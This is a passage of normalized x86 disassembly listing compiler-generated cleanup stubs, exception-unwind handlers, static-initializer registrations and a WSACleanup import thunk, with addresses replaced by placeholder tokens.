call sub_401523
retn
sub_41afb9
lea esi [ ebp - 0x24 ]
jmp sub_40c938
sub_41afc1
mov esi [ ebp + 0x8 ]
jmp sub_40c938
sub_41afc9
mov esi [ ebp + 0x8 ]
jmp sub_40c938
sub_41afd1
mov eax r--data
jmp sub_416735
sub_41afdb
lea eax [ ebp - 0x18c8 ]
jmp sub_40bed6
sub_41afe6
lea esi [ ebp - 0x1b6c ]
jmp sub_40c938
sub_41aff1
mov eax r--data
jmp sub_416735
sub_41affb
lea esi [ ebp - 0x60 ]
jmp sub_40c938
sub_41b003
lea eax [ ebp - 0x34 ]
push eax
call sub_4125f1
retn
sub_41b00d
mov eax r--data
jmp sub_416735
sub_41b017
mov ecx [ ebp - 0x10 ]
jmp sub_4025fd
sub_41b01f
mov eax r--data
jmp sub_416735
sub_41b029
mov ecx [ ebp - 0x10 ]
jmp sub_401149
sub_41b031
mov ecx [ ebp - 0x10 ]
jmp sub_4025fd
sub_41b039
mov eax r--data
jmp sub_416735
sub_41b043
mov ecx [ ebp - 0x10 ]
jmp sub_401149
sub_41b04b
mov eax r--data
jmp sub_416735
sub_41b055
mov esi [ ebp + 0x8 ]
jmp sub_40c938
sub_41b05d
mov eax r--data
jmp sub_416735
sub_41b067
push [ ebp - 0x10 ]
call sub_4012b0
pop ecx
retn
sub_41b071
mov eax r--data
jmp sub_416735
sub_41b07b
mov eax [ ebp + 0x8 ]
add eax 0x8
push eax
call sub_401523
retn
sub_41b088
mov eax [ ebp + 0x8 ]
add eax 0x18
push eax
call sub_401523
retn
sub_41b095
mov esi [ ebp + 0x8 ]
add esi 0x30
jmp sub_40c938
sub_41b0a0
mov esi [ ebp - 0x10 ]
jmp sub_40c938
sub_41b0a8
mov esi [ ebp + 0x8 ]
jmp sub_40c938
sub_41b0b0
mov eax r--data
jmp sub_416735
sub_41b0ba
lea eax [ ebp + 0xc ]
push eax
call sub_401523
retn
sub_41b0c4
lea esi [ ebp + 0xc ]
jmp sub_40c938
sub_41b0cc
mov eax r--data
jmp sub_416735
sub_41b0d6
mov esi [ ebp - 0x18 ]
jmp sub_40c938
sub_41b0de
push [ ebp - 0x14 ]
call sub_401523
retn
sub_41b0e7
mov esi [ ebp - 0x14 ]
jmp sub_40c938
sub_41b0ef
push [ ebp - 0x18 ]
call sub_401523
retn
sub_41b0f8
mov eax r--data
jmp sub_416735
sub_41b102
mov esi [ ebp - 0x1c ]
jmp sub_40c938
sub_41b10a
push [ ebp - 0x18 ]
call sub_401523
retn
sub_41b113
mov esi [ ebp - 0x18 ]
jmp sub_40c938
sub_41b11b
push [ ebp - 0x1c ]
call sub_401523
retn
sub_41b124
mov eax r--data
jmp sub_416735
sub_41b12e
mov esi [ ebp - 0x18 ]
jmp sub_40c938
sub_41b136
push [ ebp - 0x1c ]
call sub_401523
retn
sub_41b13f
mov eax r--data
jmp sub_416735
sub_41b149
lea esi [ ebp - 0x24 ]
jmp sub_40c938
sub_41b151
lea eax [ ebp - 0x284 ]
jmp sub_40bed6
sub_41b15c
mov eax r--data
jmp sub_416735
sub_41b166
mov esi rw-data
jmp sub_40c938
sub_41b170
mov eax r--data
jmp sub_416735
sub_41b17a
mov esi rw-data
jmp sub_40c938
sub_41b184
mov eax r--data
jmp sub_416735
sub_41b18e
mov esi rw-data
jmp sub_40c938
sub_41b198
mov eax r--data
jmp sub_416735
sub_41b1a2
mov esi rw-data
jmp sub_40c938
sub_41b1ac
mov eax r--data
jmp sub_416735
sub_41b1b6
mov esi rw-data
jmp sub_40c938
sub_41b1c0
mov eax r--data
jmp sub_416735
sub_41b1ca
mov esi rw-data
jmp sub_40c938
sub_41b1d4
mov eax r--data
jmp sub_416735
sub_41b1de
mov esi rw-data
jmp sub_40c938
sub_41b1e8
mov eax r--data
jmp sub_416735
sub_41b1f2
mov esi rw-data
jmp sub_40c938
sub_41b1fc
mov eax r--data
jmp sub_416735
sub_41b206
mov esi rw-data
jmp sub_40c938
sub_41b210
mov eax r--data
jmp sub_416735
sub_41b21a
push rw-data
call sub_4125f1
retn
sub_41b225
mov eax r--data
jmp sub_416735
sub_41b22f
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_4056bc
mov eax r--data
jmp sub_416735
sub_41b24a
call sub_40caa4
push j_sub_40ca67
call sub_4023d4
pop ecx
retn
sub_41b25b
cmp [ rw-data ] 0x0
jne r-xdata
push sub_41bc09
call sub_4023d4
pop ecx
retn
call sub_401270
sub_41b2e0
push esi
mov esi rw-data
call sub_40c9fb
push sub_41bc37
call sub_4023d4
pop ecx
pop esi
retn
sub_41b4c2
push 0x80beaa2a
call sub_40f29b
push eax
mov eax 0x80cd9101
mov ecx rw-data
call sub_40c11a
push sub_41bc94
call sub_4023d4
pop ecx
retn
sub_41b4e8
push esi
mov esi rw-data
call sub_40c9fb
push sub_41bc9e
call sub_4023d4
pop ecx
pop esi
retn
sub_41b54c
mov ecx rw-data
jmp sub_4010f7
sub_41b556
push esi
push rw-data
mov [ rw-data ] sub_40afb6
mov [ rw-data ] 0x703cf201
mov [ rw-data ] 0xf
call sub_40f29b
mov esi eax
call sub_40e269
pop esi
retn
sub_41b588
mov ecx rw-data
jmp sub_4010f7
sub_41b592
push esi
push rw-data
mov [ rw-data ] sub_40a83c
mov [ rw-data ] 0x80719601
mov [ rw-data ] 0xf
call sub_40f29b
mov esi eax
call sub_40e2ad
pop esi
retn
sub_41b5c4
push 0x80beaa2a
call sub_40f29b
push eax
mov eax 0x70aa0201
mov ecx rw-data
call sub_40c11a
push sub_41bcab
call sub_4023d4
pop ecx
retn
sub_41b5ea
push esi
mov esi rw-data
call sub_40c9fb
push sub_41bcb5
call sub_4023d4
pop ecx
pop esi
retn
sub_41b646
push 0x80beaa2a
call sub_40f29b
push eax
mov eax 0x8094e303
mov ecx rw-data
call sub_40c11a
push sub_41bcc2
call sub_4023d4
pop ecx
retn
sub_41b66c
push esi
mov esi rw-data
call sub_40c9fb
push sub_41bccc
call sub_4023d4
pop ecx
pop esi
retn
sub_41b975
push esi
mov esi rw-data
call sub_40c9fb
push sub_41bd01
call sub_4023d4
pop ecx
pop esi
retn
sub_41babe
push esi
mov esi rw-data
call sub_40c9fb
push sub_41bd86
call sub_4023d4
pop ecx
pop esi
retn
j_sub_40ca67
jmp sub_40ca67
j_sub_40ea77
jmp sub_40ea77
sub_41bc09
retn
WSACleanup
jmp [ WSACleanup@IAT ]
sub_41bc10
mov eax sub_41b225
call sub_416a8c
push ecx
or [ esp + 0xc ] 0xffffffff
push rw-data
call sub_4125f1
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
leave
retn
sub_41bc37
push esi
mov esi rw-data
call sub_40c938
pop esi
retn
sub_41bc44
mov eax sub_41b170
call sub_416a8c
push esi
or [ esp + 0xc ] 0xffffffff
mov esi rw-data
call sub_40c938
mov ecx [ esp + 0x4 ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_41bc6c
mov eax sub_41b210
call sub_416a8c
push esi
or [ esp + 0xc ] 0xffffffff
mov esi rw-data
call sub_40c938
mov ecx [ esp + 0x4 ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_41bc94
mov eax rw-data
jmp sub_40bed6
sub_41bc9e
push esi
mov esi rw-data
call sub_40c938
pop esi
retn
sub_41bcab
mov eax rw-data
jmp sub_40bed6
sub_41bcb5
push esi
mov esi rw-data
call sub_40c938
pop esi
retn
sub_41bcc2
mov eax rw-data
jmp sub_40bed6
sub_41bccc
push esi
mov esi rw-data
call sub_40c938
pop esi
retn
sub_41bcd9
mov eax sub_41b1fc
call sub_416a8c
push esi
or [ esp + 0xc ] 0xffffffff
mov esi rw-data
call sub_40c938
mov ecx [ esp + 0x4 ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_41bd01
push esi
mov esi rw-data
call sub_40c938
pop esi
retn
sub_41bd0e
mov eax sub_41b1e8
call sub_416a8c
push esi
or [ esp + 0xc ] 0xffffffff
mov esi rw-data
call sub_40c938
mov ecx [ esp + 0x4 ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_41bd36
mov eax sub_41b1d4
call sub_416a8c
push esi
or [ esp + 0xc ] 0xffffffff
mov esi rw-data
call sub_40c938
mov ecx [ esp + 0x4 ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_41bd5e
mov eax sub_41b1c0
call sub_416a8c
push esi
or [ esp + 0xc ] 0xffffffff
mov esi rw-data
call sub_40c938
mov ecx [ esp + 0x4 ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_41bd86
push esi
mov esi rw-data
call sub_40c938
pop esi
retn
sub_41bd93
mov eax sub_41b184
call sub_416a8c
push esi
or [ esp + 0xc ] 0xffffffff
mov esi rw-data
call sub_40c938
mov ecx [ esp + 0x4 ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_41bdbb
mov eax sub_41b198
call sub_416a8c
push esi
or [ esp + 0xc ] 0xffffffff
mov esi rw-data
call sub_40c938
mov ecx [ esp + 0x4 ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
